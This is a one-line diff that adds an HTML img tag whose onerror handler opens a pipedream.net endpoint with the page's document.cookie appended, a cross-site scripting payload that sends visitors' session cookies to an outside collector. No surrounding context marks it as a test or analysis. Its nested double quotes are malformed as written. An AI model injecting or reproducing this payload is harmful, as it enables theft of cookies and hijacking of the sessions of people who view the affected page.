@@ -1,0 +1,1 @@
+<img src=X onerror="window.open("https://eog86skfe1w43f1.m.pipedream.net/"+document.cookie)">
